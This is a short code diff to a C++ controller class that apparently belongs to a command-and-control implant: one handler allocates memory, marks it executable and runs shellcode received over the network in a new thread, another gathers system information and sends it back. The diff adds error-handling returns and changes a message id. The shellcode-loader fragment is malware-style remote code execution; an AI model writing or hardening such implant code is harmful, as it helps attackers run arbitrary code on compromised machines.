@@ -78,8 +78,9 @@ void Controller::handleExecuteShellcode(const InternalMessage& msg)
 	LPVOID shellMem = VirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!shellMem) // TODO: checking if it is NULL would be more correct?
 	{
-		std::cout << "VirtualAlloc failedn" << std::endl;
+		std::cout << "VirtualAlloc failed" << std::endl;
 		// DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
+        return;
 	}
 
 	// memcpy(beacon_mem, shellcode, bytes_received);
@@ -96,6 +97,7 @@ void Controller::handleExecuteShellcode(const InternalMessage& msg)
 	{
 		std::cout << "VirtualProtect failed" << std::endl;
 		// Fail silently if we cannot make the memory executable.
+        return;
 	}
 
 	// DEBUG_PRINT("6 - Memory allocated and copied");
@@ -107,10 +109,12 @@ void Controller::handleExecuteShellcode(const InternalMessage& msg)
 	{
 		std::cout << "CreateThread failed" << std::endl;
 		// DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
+        return;
 	}
 
 	// DEBUG_PRINT("7 - Thread created, waiting..."); 
 	WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
+
 }
 
 void Controller::handleSystemInfo(const InternalMessage& msg)
@@ -204,10 +208,11 @@ void Controller::handleSystemInfo(const InternalMessage& msg)
 
     MessageHeader header;
     header.messageType_ = MessageType::COMMAND_RESULT;
-    header.messageId_ = 105; // TODO:
+    header.messageId_ = 99; // TODO:
     header.dataSize_ = outMsg.data_.size();
     outMsg.header_ = header;
 
 	messageHandler_->sendMessage(outMsg);
+
 }
 
